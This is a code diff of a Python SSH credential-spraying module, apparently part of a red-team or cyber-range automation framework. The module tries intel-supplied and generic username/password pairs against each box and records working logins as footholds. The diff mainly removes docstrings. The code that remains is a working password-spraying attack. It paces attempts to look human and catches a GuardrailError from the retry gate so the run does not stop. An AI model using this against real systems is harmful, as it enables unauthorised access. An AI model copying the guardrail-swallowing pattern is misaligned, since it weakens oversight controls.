@@ -1,32 +1,4 @@
-"""spray_access — try the credentials intel already knows, over SSH, until one lands.
-
-The mechanic, restated on tlaloc's contract:
-
-* **candidates come from intel, never a hand-maintained table.** For each box
-  `ctx.intel.candidate_pairs(ip)` gives the per-box ground truth first (the box
-  password, the credlist accounts, nakon's machine account, and — where nakon
-  planted a `pam_permit` stack — any password at all), and the generic
-  user x password pool follows as the earlier agent's bounded guesses. Its order
-  is kept because it is the cheap half: the exact artifact pairs are tried before
-  guessing, and the attempt cap bounds the rest.
-* **SSH is the channel.** Every box on the range ships sshd, Windows included
-  (Administrator authenticates through the same transport), so one credential
-  probe is the whole mechanism — no hydra, no sshpass, no second exec idiom.
-* **A login is not a mutation.** Nothing is planted on the box and nothing is
-  changed: the outcome lives in world state (a credential plus a `user`
-  foothold), so this effect records no artifact and has no undo recipe.
-* **A cap hit is a failure, not a success.** The earlier agent returned
-  `ok=True` when the attempt cap ran out with no working pair, and the seed then
-  recorded `access` for boxes it had never entered (both Windows boxes, caught
-  live, with no foothold and no seeded persistence). Here that path returns `ok=False` and
-  says so; `ok=True` means a credential answered on the wire.
-
-Two anti-grind rules, both from the earlier agent's audited dead code: the gate's
-`ensure_retries` counter is consulted **per login** (a login at the cap is a
-dead end, skipped — not a safety breach, so it never halts the loop), and two
-consecutive transport failures end the pass, so a box that is simply gone costs
-two probes instead of the whole cap at one connect timeout each.
-"""
+"""spray_access — try the credentials intel already knows, over SSH, until one lands."""
 
 import time
 
@@ -36,10 +8,8 @@ from .base import Effect, Result, register
 # Bound for the guesses; the per-box ground truth is never capped away first.
 DEFAULT_CAP = 40
 DEFAULT_PROBE_TIMEOUT = 20
-# The earlier agent slept between attempts to look like a human rather than a
-# hammer.
+# Pace attempts like a human, not a hammer.
 DEFAULT_DELAY_SEC = 0.4
-# Consecutive unanswered probes before the pass gives up on the box.
 UNREACHABLE_AFTER = 2
 
 PROBE_LINUX = "id -un"
@@ -51,7 +21,6 @@ def probe_command(windows):
 
 
 def is_windows_box(ctx, ip):
-    """Target OS, from intel's boxes first (the authoritative field)."""
     box = ctx.intel.box_by_ip(ip)
     if box is not None:
         return bool(box.get("windows"))
@@ -59,12 +28,7 @@ def is_windows_box(ctx, ip):
 
 
 def candidate_pairs(ctx, ip):
-    """[(user, password)] for this box, in the order they are tried.
-
-    Per-box facts first (intel's `candidate_pairs(ip)`), then the generic pool
-    as guesses. Empty passwords are kept: a box with SSH password auth on and an
-    account without a password is a real range state.
-    """
+    """Per-box facts first, then the pool; empty passwords are a real range state."""
     pairs = []
     for pair in (ctx.intel.candidate_pairs(ip) or []):
         try:
@@ -81,26 +45,14 @@ def candidate_pairs(ctx, ip):
 
 
 def auth_rejected(exc):
-    """True when a transport error is the box refusing the credential.
-
-    The transport is ONE wrapper (paramiko's exception types are flattened
-    into TransportError), so the message is the only signal left. Getting this
-    wrong in either direction is expensive: treating a rejection as "unreachable"
-    gives up on a box we could still log into, and treating an unreachable box as
-    a rejection burns the whole attempt cap at one connect timeout each.
-    """
+    """The transport flattens paramiko's exception types into TransportError, so the
+    message is the only signal."""
     return "auth" in str(exc).lower()
 
 
 def within_retry_cap(ctx, ip, user):
-    """The gate's per-login anti-grind counter, used as a skip and not a halt.
-
-    `ensure_retries` raises GuardrailError by contract, but it is a counter, not
-    a safety gate (see `exec/gate.py`): a login that has already failed
-    `max_retries_per_service` times is a dead end for THIS candidate, and the
-    pass moves on. Swallowing it here is the point — letting it escape would
-    stop the run on a box that answered "wrong password" one time too often.
-    """
+    """`ensure_retries` raises GuardrailError by contract but is a counter, not a
+    safety gate: swallow it so a dead-end login is skipped, not a run-halt."""
     try:
         ctx.gate.ensure_retries(ctx.world, ip, user)
     except GuardrailError:
@@ -109,14 +61,6 @@ def within_retry_cap(ctx, ip, user):
 
 
 def probe_login(ctx, ip, user, password, windows, *, key_path=None, timeout=None):
-    """One SSH login attempt.
-
-    Returns ``(status, who, why)`` with status in:
-
-    * ``"ok"``       — the box let us in; `who` is the account it says we are.
-    * ``"rejected"`` — the box answered no (auth refused, or the probe failed).
-    * ``"transport"``— the box did not answer at all.
-    """
     cmd = probe_command(windows)
     try:
         rc, out, err = ctx.ssh.ssh(ip, user, password, cmd,
@@ -131,13 +75,6 @@ def probe_login(ctx, ip, user, password, windows, *, key_path=None, timeout=None
 
 
 def sweep(ctx, ip, candidates, windows, *, cap, timeout=None, delay=0.0):
-    """One ordered pass over ``(user, password, key_path)`` candidates.
-
-    Stops at the first login. Returns a dict the caller can render:
-    ``found`` (a dict, or None), ``attempts``, ``skipped`` (logins at the retry
-    cap), ``transport`` (unanswered probes), ``capped``, ``unreachable``,
-    ``last_error``, ``cap``.
-    """
     out = {"found": None, "attempts": 0, "skipped": 0, "transport": 0,
            "capped": False, "unreachable": False, "last_error": None, "cap": cap}
     for user, password, key_path in candidates:
@@ -156,7 +93,7 @@ def sweep(ctx, ip, candidates, windows, *, cap, timeout=None, delay=0.0):
             out["found"] = {"user": user, "password": password, "who": who,
                             "key_path": key_path}
             break
-        ctx.world.count_cred_try(ip, user)     # the gate's counter, advanced
+        ctx.world.count_cred_try(ip, user)
         out["last_error"] = why
         if status == "transport":
             out["transport"] += 1
@@ -167,7 +104,6 @@ def sweep(ctx, ip, candidates, windows, *, cap, timeout=None, delay=0.0):
 
 
 def sweep_summary(label, ip, outcome):
-    """One operator-readable line for why a pass found nothing."""
     why = f"{label} on {ip}"
     if outcome.get("attempts"):
         why += f" after {outcome['attempts']} attempt(s)"
@@ -184,8 +120,6 @@ def sweep_summary(label, ip, outcome):
 
 
 def limits_of(ctx):
-    """(cap, timeout, delay) from config, with the defaults carried over from the
-    earlier agent."""
     limits = ctx.cfg.get("limits") or {}
     return (int(limits.get("cred_spray_max", DEFAULT_CAP) or DEFAULT_CAP),
             int(limits.get("spray_probe_timeout", DEFAULT_PROBE_TIMEOUT)
@@ -230,6 +164,7 @@ class SprayAccess(Effect):
                         [(user, password, None) for user, password in pairs],
                         windows, cap=cap, timeout=timeout, delay=delay)
         found = outcome["found"]
+        # ok=True only when a credential answered on the wire; a cap hit is ok=False.
         if found is None:
             return Result(False, sweep_summary(f"no working credential in "
                                                f"{len(pairs)} candidate(s)", ip, outcome),
@@ -237,6 +172,7 @@ class SprayAccess(Effect):
                                 "candidates": len(pairs)})
 
         user, password, who = found["user"], found["password"], found["who"]
+        # Nothing changed on the box, so no artifact and no restore recipe.
         ctx.world.add_cred(user, password, source, ip)
         ctx.world.add_foothold(ip, user, password, "user", windows=windows)
         ctx.world.note(ip, f"access: credential spray landed {user} "
